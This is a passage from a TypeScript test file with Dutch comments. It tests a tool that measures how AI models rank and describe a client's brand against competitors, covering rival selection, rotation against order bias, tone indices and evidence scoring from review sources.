      { entity: entiteit("Concurrent D", "concurrent"), mentions: 2 },
    ],
    researched: ["Uit het onderzoek"],
    ownNames: ["Mijn Merk"],
  });

  ok("de bron is de meting", keuze.source === "gemeten", keuze.source);
  eq("op vermeldingen aflopend", keuze.names.join(", "), "Concurrent A, Concurrent B, Concurrent C");
  // ⚠️ `dismissed` is een expliciete beslissing van de klant. Een vergelijking
  // tegen een partij die hij zelf afwees kost het vertrouwen in het hele scherm.
  ok("een weggezette concurrent komt er nooit in", !keuze.names.includes("Weggezet BV"));
  // Een vergelijker komt wél uit de metingen maar hoort hier niet tussen:
  // "wie levert het beste werk, jij of een vergelijkingssite" is geen vraag met een antwoord.
  ok("een vergelijker evenmin", !keuze.names.includes("Werkspot"));
  ok("hooguit drie, dus vier partijen", keuze.names.length <= MAX_RIVALS);
});

group("één vermelding is toeval, en beslist dus geen derde plek", () => {
  // ⚠️ HET GEVAL DAT DIT AFVANGT, EN HET IS OP PRODUCTIE GEBEURD (23 augustus
  // 2026). Bij Van den Udenhout stonden twee partijen op 2 vermeldingen en elf
  // op precies één. De derde plek werd alfabetisch beslist en dat leverde
  // "Alfa Romeo" op: geen concurrent van een autodealer maar een merk dat hij
  // verkoopt. De klant zou zich vergelijken met een fabrikant, puur omdat de A
  // vooraan in het alfabet staat.
  const keuze = selectRivals({
    measured: [
      { entity: entiteit("Autobedrijf De Twee", "concurrent"), mentions: 2 },
      { entity: entiteit("SDL Automotive", "concurrent"), mentions: 2 },
      // Alfabetisch de eerste van de eenlingen. Mag de derde plek NIET krijgen.
      { entity: entiteit("Alfa Romeo", "concurrent"), mentions: 1 },
      { entity: entiteit("Toyota", "concurrent"), mentions: 1 },
      { entity: entiteit("Eurocars", "concurrent"), mentions: 1 },
    ],
    researched: ["Uit het onderzoek"],
    ownNames: ["Van den Udenhout"],
  });

  eq("de drempel staat op twee", String(MIN_MENTIONS), "2");
  eq(
    "alleen de twee gemeten partijen komen erin",
    keuze.names.join(", "),
    "Autobedrijf De Twee, SDL Automotive",
  );
  ok("en de alfabetisch eerste eenling niet", !keuze.names.includes("Alfa Romeo"));
  // Liever twee goede concurrenten dan drie waarvan er één willekeurig is.
  ok("er wordt niet bijgevuld tot drie", keuze.names.length === 2, `${keuze.names.length}`);
  // En het scherm zegt waarom er maar twee staan.
  ok(
    "en het scherm meldt hoeveel er afvielen",
    keuze.reason.includes("3 andere merken") && keuze.reason.includes("toeval"),
    keuze.reason,
  );

  // Komt niemand boven de drempel, dan is er geen vergelijking. Terugvallen op
  // het onderzoek zou hier verkeerd zijn: er ís gemeten, er kwam alleen niets
  // uit dat een patroon heet.
  const allemaalEenlingen = selectRivals({
    measured: [
      { entity: entiteit("Eenling A", "concurrent"), mentions: 1 },
      { entity: entiteit("Eenling B", "concurrent"), mentions: 1 },
    ],
    researched: [],
    ownNames: ["Van den Udenhout"],
  });
  ok("alleen eenlingen levert geen vergelijking", allemaalEenlingen.names.length === 0);
  ok(
    "met een uitleg die het verschil met 'niets gemeten' benoemt",
    allemaalEenlingen.reason.includes("vaker dan één keer"),
    allemaalEenlingen.reason,
  );
});

group("zonder metingen valt de keuze terug op het onderzoek, en anders op niets", () => {
  const terugval = selectRivals({
    measured: [],
    researched: ["Alfa BV", "Mijn Merk", "Beta BV", "alfa bv"],
    ownNames: ["Mijn Merk"],
  });
  ok("de bron is het onderzoek", terugval.source === "onderzoek", terugval.source);
  eq("ontdubbeld en zonder het eigen merk", terugval.names.join(", "), "Alfa BV, Beta BV");

  // ⚠️ Geen namen verzinnen. De run gaat door zonder blok V, `rank_score` blijft
  // null, en het scherm zegt waarom (conventie 3).
  const leeg = selectRivals({ measured: [], researched: [], ownNames: ["Mijn Merk"] });
  ok("bij nul bekende concurrenten is de lijst leeg", leeg.names.length === 0);
  ok("en niet een verzonnen naam", leeg.source === "geen");
  ok("met een uitleg voor op het scherm", leeg.reason.length > 20);
});

group("de rotatie zet de klant over twaalf knopen even vaak op elke plek", () => {
  const partijen = ["Mijn Merk", "Concurrent A", "Concurrent B", "Concurrent C"];
  const posities = new Map<number, number>();

  for (let slot = 0; slot < 12; slot++) {
    const volgorde = rotateParties({ runId: "run-1", parties: partijen, slot });
    const plek = positionInOrder(volgorde, "Mijn Merk");
    posities.set(plek, (posities.get(plek) ?? 0) + 1);
    ok(`slot ${slot} levert alle vier de partijen op`, volgorde.length === 4);
  }

  // Bij vier partijen en twaalf knopen is dat exact drie keer per plek. Het
  // GEMIDDELDE over de knopen is daarmee gecorrigeerd, ook al is één losse
  // knoop dat niet, en dat is precies waarom een losse knoop de chip
  // `indicatief` krijgt.
  eq(
    "elke plek precies drie keer",
    [0, 1, 2, 3].map((p) => posities.get(p) ?? 0).join(","),
    "3,3,3,3",
  );

  // ⚠️ Deterministisch. Draai je dezelfde run twee keer, dan moet de volgorde
  // hetzelfde zijn; anders weet je bij een verschil in de uitslag niet of het
  // antwoord veranderde of alleen de vraag.
  eq(
    "dezelfde run levert twee keer dezelfde volgorde",
    rotateParties({ runId: "run-1", parties: partijen, slot: 5 }).join(),
    rotateParties({ runId: "run-1", parties: partijen, slot: 5 }).join(),
  );
  ok(
    "een andere run levert een ander patroon",
    rotateParties({ runId: "run-1", parties: partijen, slot: 0 }).join() !==
      rotateParties({ runId: "run-2", parties: partijen, slot: 0 }).join(),
  );
  // Bij één partij valt er niets te roteren, en dat mag geen lege lijst worden.
  ok(
    "één partij blijft één partij",
    rotateParties({ runId: "r", parties: ["Alleen ik"], slot: 3 }).join() === "Alleen ik",
  );
});

group("de rangscore: onbekende partijen vallen uit de noemer", () => {
  eq("eerste van vier is 100", String(positionToScore(1, 4)), "100");
  eq("laatste van vier is 0", String(positionToScore(4, 4)), "0");
  eq("tweede van vier is 66,7", String(positionToScore(2, 4)), "66.7");
  // Bij drie partijen is tweede iets anders waard dan bij vier. Vandaar dat
  // `of_parties` per RIJ bewaard wordt en niet per run.
  eq("tweede van drie is 50", String(positionToScore(2, 3)), "50");
  ok("eerste van één is geen uitslag", positionToScore(1, 1) === null);

  const gevraagd = ["Mijn Merk", "A", "B", "C"];
  const uitkomst = scoreCriterion({
    criterion: "kwaliteit",
    askedParties: gevraagd,
    ownParty: "Mijn Merk",
    raw: [
      { party: "A", known: true, position: 1 },
      { party: "Mijn Merk", known: true, position: 2 },
      { party: "B", known: false, position: null },
      { party: "C", known: true, position: 4 },
      // ⚠️ Vangnet 1: modellen voegen graag een vijfde bedrijf toe. Dat is geen
      // antwoord op de vraag en het verstoort de noemer.
      { party: "Verzonnen NV", known: true, position: 3 },
    ],
  });

  ok("een partij buiten de gevraagde set wordt genegeerd", uitkomst.ofParties === 3, `${uitkomst.ofParties}`);
  ok(
    "en staat niet tussen de rijen",
    !uitkomst.placements.some((p) => p.party === "Verzonnen NV"),
  );
  // Hernummerd over wie er overbleef: A wordt 1, Mijn Merk 2, C 3.
  eq("de plaatsen zijn hernummerd", String(uitkomst.ownPosition), "2");
  eq("en de score rekent met drie partijen", String(uitkomst.ownScore), "50");
  // De onbekende partij gaat wél als rij de database in: "het model kende je
  // concurrent niet" is een bevinding.
  ok(
    "de onbekende partij blijft als rij bestaan",
    uitkomst.placements.some((p) => p.party === "B" && !p.known),
  );
});

group("geen plaats is iets anders dan een laatste plaats", () => {
  // ⚠️ Vangnet 2. Het model heeft geen oordeel geveld over de klant, en dat is
  // iets anders dan een slecht oordeel (conventie 3).
  const zonderKlant = scoreCriterion({
    criterion: "betrouwbaarheid",
    askedParties: ["Mijn Merk", "A", "B"],
    ownParty: "Mijn Merk",
    raw: [
      { party: "A", known: true, position: 1 },
      { party: "B", known: true, position: 2 },
      { party: "Mijn Merk", known: false, position: null },
    ],
  });
  ok("geen plaats", zonderKlant.ownPosition === null);
  ok("en dus geen score", zonderKlant.ownScore === null);
  ok("en zeker geen laatste plaats", zonderKlant.ownScore !== 0);

  // ⚠️ Vangnet 3. Eerste van één is geen uitslag.
  const eenPartij = scoreCriterion({
    criterion: "prijs_kwaliteit",
    askedParties: ["Mijn Merk", "A", "B"],
    ownParty: "Mijn Merk",
    raw: [
      { party: "Mijn Merk", known: true, position: 1 },
      { party: "A", known: false, position: null },
      { party: "B", known: false, position: null },
    ],
  });
  ok("bij minder dan twee bekende partijen vervalt het criterium", eenPartij.ownScore === null);
  ok("en de noemer is één", eenPartij.ofParties === 1, `${eenPartij.ofParties}`);
});

group("het middelen over criteria en knopen", () => {
  const samen = summariseRanks([
    { criterion: "dienstverlening", position: 2, ofParties: 4 },
    { criterion: "kwaliteit", position: 2, ofParties: 4 },
    { criterion: "prijs_kwaliteit", position: 4, ofParties: 4 },
    { criterion: "betrouwbaarheid", position: 1, ofParties: 4 },
  ]);
  ok("er is een score", samen.score !== null);
  eq("de gemiddelde plaats staat er los naast", String(samen.position), "2.3");
  eq("van vier partijen", String(samen.of), "4");
  // `winsOn` en `losesOn` gaan over de eigen score per criterium ten opzichte
  // van het eigen gemiddelde, niet ten opzichte van 50.
  ok("betrouwbaarheid is een winstpunt", samen.winsOn.includes("betrouwbaarheid"), samen.winsOn.join());
  ok("prijs-kwaliteit een verliespunt", samen.losesOn.includes("prijs_kwaliteit"), samen.losesOn.join());

  const niets = summariseRanks([
    { criterion: "kwaliteit", position: null, ofParties: 4 },
    { criterion: "kwaliteit", position: 1, ofParties: 1 },
  ]);
  ok("zonder bruikbaar oordeel is de score null en niet 0", niets.score === null);
  ok("en de plaats ook", niets.position === null);
});

group("het volgorde-effect wordt gemeten, niet aangenomen", () => {
  // Een run waarin de eerstgenoemde partij ALTIJD wint. Dat is precies het
  // product dat elke klant een mooie plaats geeft, en dat is erger dan geen
  // vergelijking.
  const altijdEerste = Array.from({ length: 20 }, () => ({
    firstAsked: "Partij X",
    firstAskedKnown: true,
    firstPlaced: "Partij X",
    ofParties: 4,
  }));
  const scheef = measureOrderBias(altijdEerste);
  eq("het effect is volledig", String(scheef.bias), "1");
  eq("de verwachting bij vier partijen is 25%", String(scheef.expected), "0.25");
  ok("de drempel wordt overschreden", scheef.exceeded);
  // ⚠️ Dan gaat ELKE plaats op indicatief, ook met drie rotaties eronder: als
  // vooraan staan structureel wint, zeggen drie rotaties alleen dat het effect
  // drie keer optrad.
  ok(
    "en dan is zelfs een plaats met drie rotaties indicatief",
    rankIsIndicative({ rotations: 3, bias: scheef, knownParties: 4 }),
  );

  // Zuiver toeval: de eerstgevraagde wint precies een kwart van de keren.
  const eerlijk = Array.from({ length: 20 }, (_, i) => ({
    firstAsked: "Partij X",
    firstAskedKnown: true,
    firstPlaced: i % 4 === 0 ? "Partij X" : "Partij Y",
    ofParties: 4,
  }));
  const schoon = measureOrderBias(eerlijk);
  ok("een eerlijke run blijft onder de drempel", !schoon.exceeded, String(schoon.bias));
  ok(
    "en dan mag een plaats met drie rotaties als uitslag",
    !rankIsIndicative({ rotations: 3, bias: schoon, knownParties: 4 }),
  );
  // Eén vergelijking per knoop blijft indicatief, ook zonder gemeten effect.
  ok(
    "maar één rotatie blijft indicatief",
    rankIsIndicative({ rotations: 1, bias: schoon, knownParties: 4 }),
  );

  // ⚠️ EN DE DERDE VOORWAARDE, UIT DE EERSTE ECHTE RUN. Bij Van den Udenhout
  // kende ChatGPT twee van de vier partijen niet. Wat overbleef was de klant
  // tegenover een autofabrikant, en dat kwam als "eerste van twee" als HARDE
  // UITSLAG op het scherm: drie rotaties, volgorde-effect binnen de marge, dus
  // niet indicatief. Twee partijen is genoeg om een score te berekenen, maar
  // een duel is geen marktpositie.
  ok(
    "een plaats op twee bekende partijen blijft indicatief",
    rankIsIndicative({ rotations: 3, bias: schoon, knownParties: 2 }),
  );
  ok(
    "vanaf drie bekende partijen mag hij als uitslag",
    !rankIsIndicative({ rotations: 3, bias: schoon, knownParties: 3 }),
  );

  // ⚠️ DE FOUT DIE OP PRODUCTIE GEMASKEERD WERD (23 augustus 2026). Bij Van den
  // Udenhout kende ChatGPT twee van de vier partijen niet. Een partij zonder
  // plaats kan nooit eerste worden, dus elk oordeel waarin zo'n partij vooraan
  // stond leverde gegarandeerd een misser op. Die onmogelijke gevallen
  // verdunden het cijfer van 63,6% naar 21,9%, en dan lijkt vooraan staan zelfs
  // schadelijk.
  const gemengdeSet = [
    // Elf oordelen waarin de eerstgevraagde wél gekend was: zeven keer raak.
    ...Array.from({ length: 7 }, () => ({
      firstAsked: "Gekend",
      firstAskedKnown: true,
      firstPlaced: "Gekend",
      ofParties: 2,
    })),
    ...Array.from({ length: 4 }, () => ({
      firstAsked: "Gekend",
      firstAskedKnown: true,
      firstPlaced: "Ander",
      ofParties: 2,
    })),
    // Drieëndertig oordelen waarin de eerstgevraagde onbekend was. Die kunnen
    // per definitie niet raak zijn en zeggen dus niets over de volgorde.
    ...Array.from({ length: 33 }, () => ({
      firstAsked: "Onbekend",
      firstAskedKnown: false,
      firstPlaced: "Ander",
      ofParties: 2,
    })),
  ];
  const gemeten = measureOrderBias(gemengdeSet);
  eq("de onmogelijke oordelen tellen niet mee", String(gemeten.observations), "11");
  eq("en het effect is 63,6% en niet 21,9%", String(gemeten.bias), "0.636");
  ok("wat bij elf oordelen nog binnen de ruis valt", !gemeten.exceeded, String(gemeten.bias));

  // Onder de tien oordelen is er niets vast te stellen: bij vijf is drie keer
  // raak al 60%, en dat kan puur toeval zijn (conventie 3).
  const teWeinig = measureOrderBias(
    Array.from({ length: MIN_OBSERVATIONS - 1 }, () => ({
      firstAsked: "X",
      firstAskedKnown: true,
      firstPlaced: "X",
      ofParties: 4,
    })),
  );
  ok("te weinig oordelen levert null en geen getal", teWeinig.bias === null);
  ok("en dus geen overschrijding", !teWeinig.exceeded);
});

group("de toonschaal: elk label naar het juiste getal", () => {
  eq("positief is +2", String(toneScore("positief")), "2");
  eq("overwegend positief is +1", String(toneScore("overwegend_positief")), "1");
  eq("neutraal is 0", String(toneScore("neutraal")), "0");
  // `gemengd` en `neutraal` leveren allebei 0, en zijn tóch verschillende
  // uitkomsten: bij gemengd staan er minpunten die je kunt aanpakken.
  eq("gemengd is ook 0", String(toneScore("gemengd")), "0");
  eq("negatief is -2", String(toneScore("negatief")), "-2");
  // ⚠️ Onbekend is null en niet 0. Nul is neutraal, en een model dat niets over
  // je weet is niet neutraal over je (conventie 3).
  ok("onbekend is null", toneScore("onbekend") === null);
  ok("en onzin ook", toneScore("prachtig") === null);
  ok("alle zes de labels worden herkend", TONE_LABELS.every((l) => isToneLabel(l)));

  eq("een index van 70 heet positief", toneWord(70), "positief");
  // Een index van +12 is een handvol neutrale antwoorden met één compliment
  // erin. Dat als positief presenteren is het gerustgestelde bedrijf uit §2.1.
  eq("een index van 12 heet neutraal", toneWord(12), "neutraal");
  eq("zonder index staat er geen beeld", toneWord(null), "geen beeld");
});

group("het merkcijfer: antwoorden zonder bron wegen lichter of tellen niet mee", () => {
  // ⚠️ De harde regel uit §2.1: toon zonder bewijs is geen reputatie.
  ok(
    "een antwoord zonder enige bron telt niet mee",
    !usableForTone({ toneScore: 2, grounding: "geen", mentionsBrand: true }),
  );
  // Dit is exact de fout die bij `mention_role` optrad: structured output kiest
  // bij twijfel de eerste waarde uit de lijst, en dat is hier `positief`.
  ok(
    "een antwoord over een ander bedrijf ook niet",
    !usableForTone({ toneScore: 2, grounding: "reviews", mentionsBrand: false }),
  );
  ok(
    "maar een antwoord met reviews eronder wel",
    usableForTone({ toneScore: 2, grounding: "reviews", mentionsBrand: true }),
  );

  const alleenLucht = toneIndex([
    { toneScore: 2, grounding: "geen", mentionsBrand: true },
    { toneScore: 2, grounding: "geen", mentionsBrand: true },
  ]);
  // ⚠️ Null en niet 0. Nul betekent neutraal, null betekent: er valt niets over
  // te zeggen. Verschillende uitkomsten, verschillende adviezen.
  ok("een run zonder bruikbaar antwoord levert null", alleenLucht === null);

  eq(
    "vier positieve antwoorden met reviews leveren +100",
    String(toneIndex(Array.from({ length: 4 }, () => ({ toneScore: 2, grounding: "reviews" as const, mentionsBrand: true })))),
    "100",
  );

  // Antwoorden zonder controleerbare bron wegen mee met factor 0,3: ze zeggen
  // iets, maar minder. Eén positief met reviews (gewicht 1) tegen één negatief
  // van de eigen site (gewicht 0,3) trekt de index naar boven.
  const gemengd = toneIndex([
    { toneScore: 2, grounding: "reviews", mentionsBrand: true },
    { toneScore: -2, grounding: "eigen_site", mentionsBrand: true },
  ]) as number;
  ok("een zwakke bron trekt het cijfer minder ver", gemengd > 0, `${gemengd}`);
  eq("en precies volgens de factor", String(WEAK_WEIGHT), "0.3");

  ok("drie antwoorden is genoeg om iets te zeggen", runIsUsable([
    { toneScore: 1, grounding: "reviews", mentionsBrand: true },
    { toneScore: 0, grounding: "eigen_site", mentionsBrand: true },
    { toneScore: null, grounding: "geen", mentionsBrand: true },
  ]));
  ok("twee is dat niet", !runIsUsable([
    { toneScore: 1, grounding: "reviews", mentionsBrand: true },
    { toneScore: 0, grounding: "eigen_site", mentionsBrand: true },
  ]));
});

group("een uitspraak over de reviews is geen pluspunt", () => {
  // ⚠️ Alle regels hieronder komen LETTERLIJK uit de eerste echte run, op
  // Van den Udenhout (23 augustus 2026). Verzonnen voorbeelden zouden hier
  // toetsen of ik de fout goed geraden heb; deze toetsen de fout zelf.

  // Echte eigenschappen: dit is waar de klant iets aan heeft.
  for (const goed of [
    "persoonlijke begeleiding",
    "het nakomen van afspraken",
    "duidelijke uitleg bij aflevering",
    "lange wachttijden en matige planning",
    "onduidelijke tarieven voor onderhoud of diagnose",
    "extra kosten die pas bij het afrekenen zichtbaar worden",
    "De vestiging is aangesloten bij BOVAG.",
    "Merkdealer van de Volkswagen-groep",
  ]) {
    ok(`blijft staan: "${goed.slice(0, 40)}"`, isUsablePoint(goed));
  }

  // Circulair: je sterke punt is dan dát mensen positief over je zijn. Dat zegt
  // niets, het is niets om aan te werken, en het cijfer dat erbij hoort staat
  // al in het bronnenblok met het aantal beoordelingen erbij.
  for (const fout of [
    "Het beeld is niet uitsluitend negatief.",
    "De algemene klantwaardering is op sommige platforms goed tot zeer goed.",
    "Daar staan overigens ook meerdere positieve reviews tegenover waarin verkopers juist vriendelijk en deskundig worden genoemd.",
    "algemene reputatie ... is op grote reviewplatforms overwegend positief, vooral voor ontvangst, verkoop en vriendelijkheid",
    "Er zijn ook veel positieve ervaringen: klanten noemen vriendelijke medewerkers, deskundige verkopers, goed geregelde aflevering.",
  ]) {
    ok(`valt af: "${fout.slice(0, 40)}"`, !isUsablePoint(fout));
  }

  // ⚠️ EEN CITAAT IS GEEN EIGENSCHAP (Gasservice Brabant, 23 augustus 2026).
  // De sterke punten bevatten zowel "afspraken nakomen" als "Werken netjes.
  // Komen op tijd.", en de zwakke zowel "afspraken niet nagekomen" als "Komen
  // afspraken niet na!". Twee keer hetzelfde punt, en de ontdubbeling kon dat
  // niet vangen omdat de woorden anders beginnen. Een lijst met eigenschappen
  // is een agenda om aan te werken; een lijst met citaten is een bloemlezing,
  // en daar is het veld `citaten` voor.
  for (const citaat of [
    "“Goed, snel, netjes”",
    "“Komen afspraken niet na!”",
    "“Het bedrag was dus een zeer onaangename verrassing.”",
    "“Werken netjes. Komen op tijd.”",
  ]) {
    ok(`een citaat valt af: ${citaat.slice(0, 28)}`, !isUsablePoint(citaat));
  }
  // Maar de eigenschap die hetzelfde zegt blijft staan.
  ok("de eigenschap ernaast blijft", isUsablePoint("afspraken niet nagekomen"));
  ok("en deze ook", isUsablePoint("onverwacht hoog bedrag"));

  // Een hele alinea is geen punt maar een samenvatting, en die hoort in de
  // synthese.
  ok("een alinea valt af", !isUsablePoint("x".repeat(200)));
  ok("een lege regel ook", !isUsablePoint("   "));

  // ⚠️ Bij twijfel houden we het punt: een weggegooide bevinding kost meer dan
  // een rare regel op het scherm. Deze is lang maar wél een eigenschap.
  ok(
    "een lange maar echte eigenschap blijft",
    isUsablePoint(
      "het aanbod omvat onder meer de Shuttel-mobiliteitskaart, fietslease via VELOO, poolmanagement, WeGo en tijdelijke mobiliteitsoplossingen",
    ),
  );

  // De ontdubbeling kijkt naar de eerste drie woorden: twee formuleringen van
  // hetzelfde bezwaar zijn één punt, anders blijven ze allebei onder de
  // patroondrempel en verdwijnt een bezwaar dat wél terugkomt.
  const opgeschoond = cleanPoints([
    "levertijd valt tegen",
    "levertijd valt soms tegen",
    "Het beeld is niet uitsluitend negatief.",
    "persoonlijke begeleiding",
    "",
  ]);
  eq("ontdubbeld en opgeschoond", opgeschoond.join(" | "), "levertijd valt tegen | persoonlijke begeleiding");
  ok("hooguit acht punten", cleanPoints(Array.from({ length: 20 }, (_, i) => `punt ${i} van de lijst`)).length === 8);

  // ⚠️ De synthese groepeert punten over ANTWOORDEN heen met dezelfde sleutel.
  // Met een eigen kopie telden "persoonlijke begeleiding" en "persoonlijke
  // begeleiding bij aankoop" als twee patronen, en stonden ze allebei in de
  // sterke punten van de eerste echte run.
  eq(
    "een uitbreiding van hetzelfde punt is hetzelfde punt",
    dedupeSleutel("persoonlijke begeleiding"),
    dedupeSleutel("persoonlijke begeleiding bij aankoop"),
  );
  ok(
    "maar een ander tweede woord is een ander punt",
    dedupeSleutel("persoonlijke begeleiding") !== dedupeSleutel("persoonlijke aandacht"),
  );
});

group("de bewijskracht: alleen de eigen site levert een laag getal", () => {
  // ⚠️ Ook bij tien vermeldingen. Een merk waar AI alles van de eigen site
  // haalt, heeft geen reputatie maar een website.
  const alleenEigen = evidenceScore(
    Array.from({ length: 10 }, (_, i) => ({
      domain: `eigen.nl/pagina-${i}`,
      isOwn: true,
      isReview: false,
      verifiedRating: false,
    })),
  );
  ok("tien eigen pagina's leveren een laag getal", alleenEigen <= 10, `${alleenEigen}`);

  ok("nul bronnen levert 0, en dat is een echte uitkomst", evidenceScore([]) === 0);

  const sterk = evidenceScore([
    { domain: "eigen.nl", isOwn: true, isReview: false, verifiedRating: false },
    { domain: "trustpilot.com", isOwn: false, isReview: true, verifiedRating: true },
    { domain: "vakblad.nl", isOwn: false, isReview: false, verifiedRating: false },
    { domain: "google.com", isOwn: false, isReview: true, verifiedRating: false },
    { domain: "kvk.nl", isOwn: false, isReview: false, verifiedRating: false },
    { domain: "regionaalnieuws.nl", isOwn: false, isReview: false, verifiedRating: false },
  ]);
  ok("vijf externe bronnen met een bevestigd cijfer leveren veel", sterk >= 80, `${sterk}`);

  // Een reviewplatform ZONDER bevestigd cijfer levert de 20 punten niet op: een
  // cijfer uit een AI-antwoord is een gok tot het bewezen is (§2.4).
  const onbevestigd = evidenceScore([
    { domain: "trustpilot.com", isOwn: false, isReview: true, verifiedRating: false },
  ]);
  const bevestigd = evidenceScore([
    { domain: "trustpilot.com", isOwn: false, isReview: true, verifiedRating: true },
  ]);
  ok("een onbevestigd cijfer telt lichter", onbevestigd < bevestigd, `${onbevestigd} < ${bevestigd}`);
});

group("de verdeling zegt wat het gemiddelde verzwijgt", () => {
  const antwoord = (tone: string, score: number | null) => ({
    tone,
    toneScore: score,
    grounding: "reviews" as const,
    mentionsBrand: true,
  });

  // ⚠️ DE WERKELIJKE UITKOMST VAN DE EERSTE ECHTE RUN (Van den Udenhout,
  // 23 augustus 2026): tien keer gemengd, drie keer overwegend positief, één
  // keer negatief. Daar komt een toon van rond de nul uit, en dat heet
  // "neutraal" op het scherm.
  const echteRun = [
    ...Array.from({ length: 10 }, () => antwoord("gemengd", 0)),
    ...Array.from({ length: 3 }, () => antwoord("overwegend_positief", 1)),
    antwoord("negatief", -2),
  ];

  // Een merk waar werkelijk niemand een mening over heeft: even veel antwoorden,
  // dezelfde index van ongeveer nul, compleet ander merk.
  const echtNeutraal = Array.from({ length: 14 }, () => antwoord("neutraal", 0));

  const indexEcht = toneIndex(echteRun);
  const indexNeutraal = toneIndex(echtNeutraal);
  ok(
    "beide komen op vrijwel dezelfde index uit",
    Math.abs((indexEcht ?? 0) - (indexNeutraal ?? 0)) < 10,
    `${indexEcht} tegen ${indexNeutraal}`,
  );

  const verdeeldheidEcht = toneDistribution(echteRun);
  const verdeeldheidNeutraal = toneDistribution(echtNeutraal);
  // ⚠️ En hier scheiden ze. Dat is het hele punt: het gemiddelde maakte twee
  // compleet verschillende merken identiek. Tien keer gemengd is een merk met
  // een probleem dat je kunt oplossen; tien keer neutraal is een merk zonder
  // profiel.
  ok(
    "maar de verdeeldheid scheidt ze wel",
    verdeeldheidEcht.spread > verdeeldheidNeutraal.spread + 25,
    `${verdeeldheidEcht.spread} tegen ${verdeeldheidNeutraal.spread}`,
  );
  eq("een volstrekt eenstemmig merk heeft geen spreiding", String(verdeeldheidNeutraal.spread), "0");
  eq("en de verdeling telt de labels", String(verdeeldheidEcht.counts["gemengd"]), "10");

  // De zin eronder is wat een consultant voorleest.
  const zin = spreadSentence(verdeeldheidEcht) ?? "";
  ok("de zin benoemt het verdeelde imago", zin.includes("verdeeld imago"), zin);
  ok(
    "en bij een eenstemmig merk zegt hij dat ook",
    (spreadSentence(verdeeldheidNeutraal) ?? "").includes("eenduidig"),
  );

  // ⚠️ Onder de drie antwoorden geen uitspraak: dan is spreiding een verschil
  // en geen spreiding (conventie 3).
  ok("onder de drie antwoorden geen zin", spreadSentence(toneDistribution(echteRun.slice(0, 2))) === null);
});

group("het hoofdcijfer krijgt een marge, net als de meting ernaast", () => {
  const maak = (score: number) => ({
    toneScore: score,
    grounding: "reviews" as const,
    mentionsBrand: true,
  });

  ok("met twee antwoorden is er geen marge", toneStderr([maak(1), maak(2)]) === null);

  const eenstemmig = toneStderr(Array.from({ length: 6 }, () => maak(1)));
  const verdeeld = toneStderr([maak(2), maak(-2), maak(2), maak(-2), maak(0), maak(1)]);
  // ⚠️ HET GEVAL UIT DE TWEEDE RUN OP GASSERVICE BRABANT. Alle 24 bruikbare
  // antwoorden kregen daar hetzelfde label, dus de spreiding was 0 en de
  // standaardfout ook. Dat leest als een cijfer dat tot op de punt nauwkeurig
  // is, terwijl het betekent dat het instrument geen verschil zág. En het is
  // niet alleen een leeswijze: met marge 0 zou elk verschil met een volgende
  // meting "echt veranderd" heten, hoe klein ook.
  //
  // De ondergrens komt uit de schaal zelf: de labels liggen 50 punten uit
  // elkaar, dus 50 gedeeld door de wortel uit 12, gedeeld door de wortel uit
  // zes antwoorden, is 5,9.
  ok("zes identieke antwoorden geven nooit marge nul", (eenstemmig ?? 0) > 0, String(eenstemmig));
  eq("maar de ondergrens uit de schaal", String(eenstemmig), "5.9");
  ok("en zes verdeelde een echte marge", (verdeeld ?? 0) > 15, String(verdeeld));
  // De ondergrens loopt terug naarmate er meer antwoorden zijn: meer metingen,
  // meer zekerheid, ook als ze allemaal hetzelfde zeggen.
  ok(
    "meer antwoorden maken de ondergrens kleiner",
    (toneStderr(Array.from({ length: 24 }, () => maak(1))) ?? 99) < (eenstemmig ?? 0),
    String(toneStderr(Array.from({ length: 24 }, () => maak(1)))),
  );
});

group("de bewijskracht meet onafhankelijkheid en niet aantal", () => {
  // ⚠️ HET GEVAL UIT DE EERSTE ECHTE RUN. Autoscout24 en Klantenvertellen
  // stonden allebei op 3.704 beoordelingen. Dat is geen toeval: de verzamelsite
  // toont het cijfer van de ander. Als twee onafhankelijke bronnen geteld,
  // verdubbelen ze de bewijskracht op één waarneming.
  ok("autoscout24 is een verzamelsite", isAggregator("autoscout24.nl"));
  ok("klantenvertellen niet", !isAggregator("klantenvertellen.nl"));

  const bron = (domain: string, opties: Partial<{ isOwn: boolean; isReview: boolean; verifiedRating: boolean; isAggregator: boolean }> = {}) => ({
    domain,
    isOwn: opties.isOwn ?? false,
    isReview: opties.isReview ?? false,
    verifiedRating: opties.verifiedRating ?? false,
    isAggregator: opties.isAggregator ?? false,
  });

  const echteBronnen = evidenceScore([
    bron("eigen.nl", { isOwn: true }),
    bron("klantenvertellen.nl", { isReview: true, verifiedRating: true }),
    bron("vakblad.nl"),
    bron("regionaalnieuws.nl"),
  ]);
  const zelfdeMaarVerzameld = evidenceScore([
    bron("eigen.nl", { isOwn: true }),
    bron("klantenvertellen.nl", { isReview: true, verifiedRating: true }),
    bron("autoscout24.nl", { isAggregator: true }),
    bron("autotrack.nl", { isAggregator: true }),
  ]);
  ok(
    "verzamelsites tellen lichter dan echte bronnen",
    echteBronnen > zelfdeMaarVerzameld,
    `${echteBronnen} tegen ${zelfdeMaarVerzameld}`,
  );

  // ⚠️ De oude formule liep vol bij vijf externe domeinen, en vrijwel elk
  // bedrijf met een website haalt dat. Van den Udenhout kwam op 94 uit terwijl
  // er een verzonnen domein tussen stond. Een cijfer dat bijna iedereen haalt
  // is geen cijfer.
  const vijfExtern = evidenceScore([
    bron("eigen.nl", { isOwn: true }),
    ...Array.from({ length: 5 }, (_, i) => bron(`extern-${i}.nl`)),
  ]);
  ok("vijf gewone externe bronnen halen geen topscore meer", vijfExtern < 80, `${vijfExtern}`);

  const echtSterk = evidenceScore([
    bron("eigen.nl", { isOwn: true }),
    bron("klantenvertellen.nl", { isReview: true, verifiedRating: true }),
    ...Array.from({ length: 8 }, (_, i) => bron(`vakblad-${i}.nl`)),
  ]);
  ok("een breed en bevestigd bronnenlandschap wel", echtSterk >= 85, `${echtSterk}`);

  ok("nul bronnen blijft 0, en dat is een echte uitkomst", evidenceScore([]) === 0);

  // Alleen de eigen site blijft laag, ook bij tien pagina's: een merk waar AI
  // alles van de eigen site haalt heeft geen reputatie maar een website.
  const alleenEigen = evidenceScore(
    Array.from({ length: 10 }, (_, i) => bron(`eigen.nl/p${i}`, { isOwn: true })),
  );
  ok("alleen de eigen site blijft laag", alleenEigen <= 10, `${alleenEigen}`);
});

group("de marktvraag ontdekt concurrenten in plaats van ze aan te nemen", () => {
  const eigen = ["Gasservice Brabant"];

  const uitkomst = readMarketAnswer(
    [
      { name: "Feenstra", position: 1, reason: "landelijk bekend" },
